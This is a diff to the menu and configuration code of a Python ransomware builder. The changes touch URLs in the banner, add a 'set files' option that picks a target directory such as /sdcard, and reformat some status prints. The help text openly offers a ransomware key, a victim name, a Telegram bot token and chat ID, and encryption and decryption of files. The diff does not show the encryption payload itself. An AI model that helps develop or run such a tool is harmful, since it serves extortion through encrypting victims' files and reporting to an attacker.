@@ -12,8 +12,8 @@ kay = " "
 def logo():
  os.system('python3 buner.py')
  print("""
-\033[1;31m      youtube : \033[1;37m@al0hamwi
-\033[1;31m      instagram : \033[1;37mal0hamwi
+\033[1;31m      youtube : \033[1;37mhttps://www.youtube.com/@al0hamwi
+\033[1;31m      instagram : \033[1;37mhttps://www.instagram.com/al0hamwi
  """)
 
 def help():
@@ -22,7 +22,8 @@ def help():
 \033[1;32m       set TOKEN\033[1;34m      : \033[1;33mSet Your Bot token \033[1;34m(\033[1;37mset Token gfhdghdg#\033[1;34m)
 \033[1;32m       set ID\033[1;34m         : \033[1;33mSet Your Id Telegram \033[1;34m(\033[1;37mset Id 1337\033[1;34m)
 \033[1;32m       set OUTPUT\033[1;34m     : \033[1;33mSet Your Output Name And Path \033[1;34m(\033[1;37mset OUTPUT /home/encryption\033[1;34m)
-\033[1;32m       show values\033[1;34m    : \033[1;33mShow Token, Id And Output Value and name and 
+\033[1;32m       show \033[1;34m          : \033[1;33mShow Token, Id And Output Value and name and 
+\033[1;32m       set files\033[1;34m      : \033[1;33mSet pwd Files enc or dec \033[1;34m(\033[1;37mset files /sdcard\033[1;34m)
 \033[1;32m       set KAY\033[1;34m        : \033[1;33mSet Your kay Ransomware \033[1;34m(\033[1;37mset kay bs75b45by45y\033[1;34m)
 \033[1;32m       set NAME\033[1;34m       : \033[1;33mSet Your Victam Name \033[1;34m(\033[1;37mset name VictamName\033[1;34m)
 \033[1;32m       encryption\033[1;34m     : \033[1;33mmake encryption file \033[1;34m(\033[1;37mencryption or enc\033[1;34m)
@@ -79,7 +80,7 @@ def main():
                 print "\n\033[0;31m[!] TOKEN   : %s\n[!] ID   : %s\n[!] OUTPUT : %s\n[!] FILES   : %s\n[!] NAME   : %s\n"%(token,Id,output,files,name)
 
         elif cmd == "decryption" or cmd == "dec":
-            if kay != " " and output != " " and files != " ":
+            if files != " " and output != " " and kay != " ":
                 print("[+] Generating Kay Ransomware . . .")
                 sleep(1)
                 print("\033[1;32m[\033[1;34m*]\033[1;32m \033[1;32mUsing Configuration . . .\n |_ KAY   : "+kay+"\n |_ OUTPUT : "+output+"\n |_ FILES : "+files)
@@ -89,7 +90,7 @@ def main():
                 sleep(1)
                 main()
             else:
-                print "\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33mKAY   : %s\n[!] OUTPUT : %s\n[!] FILES   : %s\n"%(kay,output,files)
+                print "\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33m KAY : %s\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33m OUTPUT : %s\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33m FILES   : %s\n"%(kay,output,files)
         else:
             print("\033[1;31m[!] Check Your Command \033[1;32m. . .")
             main()
